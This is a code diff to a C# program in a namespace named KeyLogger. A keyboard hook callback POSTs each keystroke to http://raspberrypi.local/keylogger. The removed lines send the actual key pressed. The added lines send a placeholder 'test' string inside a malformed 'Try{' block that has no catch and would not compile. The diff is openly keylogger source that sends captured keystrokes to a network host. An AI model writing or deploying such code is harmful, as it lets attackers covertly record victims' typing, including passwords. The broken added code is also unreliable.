@@ -36,16 +36,18 @@ namespace KeyLogger {
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-        int vkCode = Marshal.ReadInt32(lParam);
-        string URL = "http://raspberrypi.local/keylogger";
-        System.Net.WebRequest webRequest = System.Net.WebRequest.Create(URL);
-        webRequest.Method = "POST";
-        webRequest.ContentType = "application/json";
-        Stream reqStream = webRequest.GetRequestStream();
-        string postData = "{\"data\": \""+((Keys)vkCode)+"\"}";
-        byte[] postArray = Encoding.ASCII.GetBytes(postData);
-        reqStream.Write(postArray, 0, postArray.Length);
-        reqStream.Close();
+        Try{
+          int vkCode = Marshal.ReadInt32(lParam);
+          string URL = "http://raspberrypi.local/keylogger";
+          System.Net.WebRequest webRequest = System.Net.WebRequest.Create(URL);
+          webRequest.Method = "POST";
+          webRequest.ContentType = "application/json";
+          Stream reqStream = webRequest.GetRequestStream();
+          string postData = "{\"data\": \"test\"}";
+          byte[] postArray = Encoding.ASCII.GetBytes(postData);
+          reqStream.Write(postArray, 0, postArray.Length);
+          reqStream.Close();
+        }
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
